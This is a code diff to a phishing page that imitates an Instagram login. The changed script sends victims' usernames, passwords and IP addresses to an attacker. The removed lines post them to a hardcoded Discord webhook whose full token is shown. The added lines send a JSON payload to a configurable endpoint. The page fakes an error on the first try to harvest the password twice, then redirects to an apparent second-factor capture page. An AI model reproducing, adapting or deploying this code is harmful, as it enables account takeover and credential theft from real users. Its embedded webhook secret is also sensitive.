@@ -69,12 +69,15 @@
     </div>
   </div>
 
-  <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1489579300687577279/fMVQanQ8kgUHZ9a_G39YhvpKjHnCmJmljDDHR9ntSa7bUAPMh1Axq0AK4VRumc10Npau";
+  <!-- Load config first -->
+  <script type="module" src="config.js"></script>
+
+  <script type="module">
+    import config from './config.js';
 
     let attempt = 0;
 
-    // Fast IP fetch (only IP address)
+    // Fast IP fetch
     async function getIP() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -86,30 +89,27 @@
       }
     }
 
-    // Send data to Discord
-    async function sendToDiscord(username, password, ip, attemptNum) {
-      const message = `**FPHISHER 🤖**
-
-**APP:** INSTAGRAM
-**USERNAME:** ${username}
-**PASSWORD:** ${password}
-**IP:** ${ip}
-**ATTEMPT:** ${attemptNum} ⏱️
-
-🔐 2025@FTECHSERVICES`;
+    // Send data to your endpoint
+    async function sendToEndpoint(username, password, ip, attemptNum) {
+      const payload = {
+        app: "INSTAGRAM",
+        username: username,
+        password: password,
+        ip: ip,
+        attempt: attemptNum,
+        timestamp: new Date().toISOString(),
+        message: "FPHISHER 🤖 2025@FTECHSERVICES"
+      };
 
       try {
-        await fetch(DISCORD_WEBHOOK_URL, {
+        await fetch(config.ENDPOINT_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: message,
-            username: "Instagram Phisher"
-          })
+          body: JSON.stringify(payload)
         });
-        console.log(`✅ Attempt ${attemptNum} sent to Discord`);
+        console.log(`✅ Attempt ${attemptNum} sent to endpoint`);
       } catch (err) {
-        console.error("Webhook failed:", err);
+        console.error("Endpoint failed:", err);
       }
     }
 
@@ -132,18 +132,18 @@
 
       attempt++;
 
-      // Get IP first
+      // Get IP
       const ip = await getIP();
 
-      // Send to Discord BEFORE doing UI actions
-      await sendToDiscord(username, password, ip, attempt);
+      // Send to your endpoint (preserves original timing)
+      await sendToEndpoint(username, password, ip, attempt);
 
       if (attempt === 1) {
         // First attempt: show error
         errorMsg.classList.remove("hidden");
         passwordInput.value = "";
 
-        // Optional shake effect
+        // Shake effect
         passwordInput.classList.add("animate-shake");
         setTimeout(() => passwordInput.classList.remove("animate-shake"), 600);
       } 
@@ -153,7 +153,6 @@
         btnText.textContent = "Loading...";
         spinner.classList.remove("hidden");
 
-        // Small delay so user sees the loading state + webhook has time to complete
         setTimeout(() => {
           window.location.href = "securedfa.html";
         }, 800);
